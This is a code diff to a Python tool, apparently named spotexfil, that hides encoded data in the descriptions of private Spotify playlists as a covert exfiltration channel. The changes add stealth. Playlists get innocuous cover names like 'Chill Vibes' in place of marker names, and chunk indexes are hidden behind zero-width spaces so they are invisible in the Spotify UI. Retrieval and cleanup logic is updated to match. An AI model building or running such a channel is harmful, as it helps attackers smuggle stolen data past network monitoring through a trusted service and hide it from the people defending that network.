@@ -4,9 +4,11 @@ Handles authentication, playlist CRUD, and payload chunking via
 Spotify playlist descriptions (512 characters per playlist).
 """
 
-import os
+import configparser
 import html
+import os
 import random
+import string
 import sys
 import time
 
@@ -30,20 +32,70 @@ DEFAULT_ARTISTS = [
     "Martin Garrix", "Armin van Buuren", "David Guetta",
 ]
 
-# Prefix marker for payload playlists (used in name matching)
-PLAYLIST_MARKER = "payloadChunk"
+# Hidden marker embedded in playlist descriptions for identification
+# Format: description = <chunk_data> + MARKER_SEP + <json metadata>
+MARKER_SEP = "\u200b"  # zero-width space (invisible in Spotify UI)
+
+# Innocuous playlist name templates
+COVER_NAMES = [
+    "Chill Vibes", "Morning Coffee", "Workout Mix", "Road Trip",
+    "Late Night", "Study Session", "Party Hits", "Throwback",
+    "Relaxation", "Good Mood", "Focus Flow", "Sunday Morning",
+    "Summer Jams", "Indie Finds", "Deep Cuts", "Evening Wind Down",
+    "Energy Boost", "Acoustic Covers", "Rainy Day", "Dance Floor",
+]
+
+# Config file search paths (first found wins)
+CONFIG_PATHS = [
+    os.path.join(os.getcwd(), '.spotexfil.conf'),
+    os.path.expanduser('~/.spotexfil.conf'),
+]
+
+
+def load_config() -> dict:
+    """Load Spotify credentials from config file if available.
+
+    Searches .spotexfil.conf in CWD then home directory.
+    Environment variables always take precedence.
+
+    Returns:
+        Dict of credential key->value pairs found in config.
+    """
+    config = configparser.ConfigParser()
+    for path in CONFIG_PATHS:
+        if os.path.isfile(path):
+            config.read(path)
+            if 'spotify' in config:
+                section = config['spotify']
+                result = {}
+                key_map = {
+                    'username': 'SPOTIFY_USERNAME',
+                    'client_id': 'SPOTIFY_CLIENT_ID',
+                    'client_secret': 'SPOTIFY_CLIENT_SECRET',
+                    'redirect_uri': 'SPOTIFY_REDIRECTURI',
+                }
+                for conf_key, env_key in key_map.items():
+                    if conf_key in section:
+                        result[env_key] = section[conf_key]
+                print(f"[*] Loaded config from {path}")
+                return result
+    return {}
 
 
 class Spot:
     """Spotify API interface for covert data transmission."""
 
-    def __init__(self):
+    def __init__(self, use_cover_names: bool = True):
         """Authenticate and establish a Spotify session.
+
+        Args:
+            use_cover_names: Use innocuous random playlist names
+                instead of indexed marker names (default True).
 
         Raises:
             SystemExit: If environment variables are missing or auth fails.
         """
-        self.playlist_marker = PLAYLIST_MARKER
+        self.use_cover_names = use_cover_names
         self.scope = (
             'user-library-read user-library-modify '
             'playlist-modify-private playlist-read-private'
@@ -52,11 +104,19 @@ class Spot:
         self._authenticate()
 
     def _load_credentials(self):
-        """Load Spotify credentials from environment variables.
+        """Load Spotify credentials from config file then env vars.
+
+        Config file values are used as defaults; env vars override.
 
         Raises:
             SystemExit: If any required variable is missing.
         """
+        # Load config file defaults into env if not already set
+        config_vals = load_config()
+        for key, value in config_vals.items():
+            if key not in os.environ:
+                os.environ[key] = value
+
         required_vars = [
             "SPOTIFY_USERNAME", "SPOTIFY_REDIRECTURI",
             "SPOTIFY_CLIENT_ID", "SPOTIFY_CLIENT_SECRET",
@@ -69,6 +129,7 @@ class Spot:
         except KeyError as err:
             print(f"[!] Missing environment variable: {err}")
             print(f"[!] Required: {', '.join(required_vars)}")
+            print("[!] Set env vars or create ~/.spotexfil.conf")
             sys.exit(1)
 
     def _authenticate(self):
@@ -112,23 +173,125 @@ class Spot:
             offset += limit
         return all_playlists
 
+    def _is_payload_playlist(self, playlist: dict) -> bool:
+        """Check if a playlist is a spotexfil payload playlist.
+
+        Detects both legacy naming (N-payloadChunk) and new hidden
+        marker format (zero-width space + JSON metadata).
+
+        Args:
+            playlist: Playlist dict from Spotify API.
+
+        Returns:
+            True if this is a payload playlist.
+        """
+        name = playlist.get('name', '')
+        # Legacy format
+        if 'payloadChunk' in name:
+            return True
+        # New format: check description for hidden marker
+        desc = playlist.get('description', '')
+        if MARKER_SEP in desc:
+            return True
+        return False
+
+    def _get_chunk_index(self, playlist: dict) -> int:
+        """Extract chunk index from a payload playlist.
+
+        Supports both legacy (name prefix) and new (description
+        metadata) formats.
+
+        Args:
+            playlist: Playlist dict with full description.
+
+        Returns:
+            Integer chunk index (0 if unparseable).
+        """
+        name = playlist.get('name', '')
+        # Legacy format: "3-payloadChunk"
+        if 'payloadChunk' in name:
+            prefix = name.split('-')[0]
+            try:
+                return int(prefix)
+            except ValueError:
+                return 0
+        # New format: metadata after zero-width space
+        desc = playlist.get('description', '')
+        if MARKER_SEP in desc:
+            meta_str = desc.split(MARKER_SEP, 1)[1]
+            try:
+                import json
+                meta = json.loads(meta_str)
+                return meta.get('i', 0)
+            except (json.JSONDecodeError, ValueError):
+                return 0
+        return 0
+
+    def _get_chunk_data(self, description: str) -> str:
+        """Extract payload data from a playlist description.
+
+        Strips the hidden metadata suffix if present.
+
+        Args:
+            description: Raw playlist description.
+
+        Returns:
+            The payload chunk data only.
+        """
+        if MARKER_SEP in description:
+            return description.split(MARKER_SEP, 1)[0]
+        return description
+
+    def _generate_cover_name(self) -> str:
+        """Generate an innocuous-looking playlist name.
+
+        Returns:
+            Random name like "Chill Vibes #a3f2".
+        """
+        name = random.choice(COVER_NAMES)
+        suffix = ''.join(random.choices(
+            string.ascii_lowercase + string.digits, k=4
+        ))
+        return f"{name} #{suffix}"
+
     def clear_data(self):
-        """Delete all payload playlists from the account."""
+        """Delete all payload playlists from the account.
+
+        Detects both legacy and new format playlists.
+        """
         playlists = self._get_all_playlists()
         count = 0
+
+        # For new format, we need full descriptions
         for playlist in playlists:
-            if self.playlist_marker in playlist['name']:
+            name = playlist.get('name', '')
+            # Quick check on name for legacy
+            if 'payloadChunk' in name:
                 self.spotipy.user_playlist_unfollow(
                     self.username, playlist['id']
                 )
                 count += 1
+                continue
+            # For new format, fetch full playlist to get description
+            try:
+                full = self.spotipy.user_playlist(
+                    self.username, playlist['id']
+                )
+                desc = full.get('description', '')
+                if MARKER_SEP in desc:
+                    self.spotipy.user_playlist_unfollow(
+                        self.username, playlist['id']
+                    )
+                    count += 1
+            except spotipy.SpotifyException:
+                pass
+
         print(f"[*] Data cleared ({count} playlists removed)")
 
     def retrieve_playlists(self) -> str:
         """Retrieve and reassemble payload from playlist descriptions.
 
-        Playlists are sorted by their numeric prefix to ensure correct
-        ordering regardless of API return order.
+        Supports both legacy and new format playlists.
 
         Returns:
             Concatenated payload string from all matching playlists.
@@ -143,35 +306,31 @@ class Spot:
             print(f"[!] Cannot retrieve playlists: {err}")
             sys.exit(1)
 
-        # Filter and sort payload playlists by index
+        # Fetch full details and filter payload playlists
         payload_playlists = []
         for p in playlists:
-            if self.playlist_marker in p['name']:
-                payload_playlists.append(p)
-
-        # Sort by numeric prefix (e.g., "3-payloadChunk" -> 3)
-        def sort_key(p):
-            name = p['name']
-            prefix = name.split('-')[0]
             try:
-                return int(prefix)
-            except ValueError:
-                return 0
+                full = self.spotipy.user_playlist(
+                    self.username, p['id']
+                )
+                full['name'] = p.get('name', '')
+                if self._is_payload_playlist(full):
+                    payload_playlists.append(full)
+            except spotipy.SpotifyException as err:
+                print(f"[!] Cannot read playlist {p['id']}: {err}")
+                sys.exit(1)
 
-        payload_playlists.sort(key=sort_key)
+        # Sort by chunk index
+        payload_playlists.sort(key=self._get_chunk_index)
 
         descriptions = ''
         for playlist in payload_playlists:
-            try:
-                results = self.spotipy.user_playlist(
-                    self.username, playlist['id']
-                )
-                desc = html.unescape(results.get('description', ''))
-                descriptions += desc
-                print(f"\t[*] Retrieved {playlist['name']}")
-            except spotipy.SpotifyException as err:
-                print(f"[!] Cannot read playlist {playlist['id']}: {err}")
-                sys.exit(1)
+            desc = html.unescape(playlist.get('description', ''))
+            chunk = self._get_chunk_data(desc)
+            descriptions += chunk
+            display = playlist.get('name', playlist.get('id', '?'))
+            idx = self._get_chunk_index(playlist)
+            print(f"\t[*] Retrieved chunk {idx}: {display}")
 
         print(f"[*] Retrieved {len(payload_playlists)} chunks")
         return descriptions
@@ -179,8 +338,7 @@ class Spot:
     def generate_playlists(self, payload: str):
         """Chunk payload and store in Spotify playlist descriptions.
 
-        Each chunk becomes a private playlist's description field.
-        Playlists are filled with random filler tracks for cover.
+        Uses innocuous cover names with hidden metadata markers.
 
         Args:
             payload: The encoded payload string to transmit.
@@ -198,23 +356,39 @@ class Spot:
 
         print("[*] Generating playlists")
 
-        if len(payload) <= CHUNK_SIZE:
+        # Account for metadata suffix in chunk size
+        # Metadata format: MARKER_SEP + {"i":N} = ~10-15 chars
+        meta_overhead = 20  # conservative
+        effective_chunk = CHUNK_SIZE - meta_overhead
+
+        if len(payload) <= effective_chunk:
             chunks = [payload]
         else:
             chunks = [
-                payload[i:i + CHUNK_SIZE]
-                for i in range(0, len(payload), CHUNK_SIZE)
+                payload[i:i + effective_chunk]
+                for i in range(0, len(payload), effective_chunk)
             ]
 
         for idx, chunk in enumerate(chunks, start=1):
-            playlist_name = f"{idx}-{self.playlist_marker}"
+            if self.use_cover_names:
+                playlist_name = self._generate_cover_name()
+                import json
+                meta = json.dumps({"i": idx}, separators=(',', ':'))
+                description = chunk + MARKER_SEP + meta
+            else:
+                playlist_name = f"{idx}-payloadChunk"
+                description = chunk
+
             try:
                 playlist = self.spotipy.user_playlist_create(
                     self.username, playlist_name,
                     public=False, collaborative=False,
-                    description=chunk
+                    description=description
                 )
-                print(f"\t[*] Created {playlist_name} ({len(chunk)} bytes)")
+                print(
+                    f"\t[*] Created [{idx}/{len(chunks)}] "
+                    f"{playlist_name} ({len(chunk)} chars)"
+                )
             except spotipy.SpotifyException as err:
                 print(f"[!] Cannot create playlist: {err}")
                 sys.exit(1)
@@ -228,7 +402,6 @@ class Spot:
                     )
             except spotipy.SpotifyException as err:
                 print(f"[!] Cannot add filler tracks: {err}")
-                # Non-fatal: continue without tracks
 
             # Brief delay to avoid rate limiting
             time.sleep(0.1)
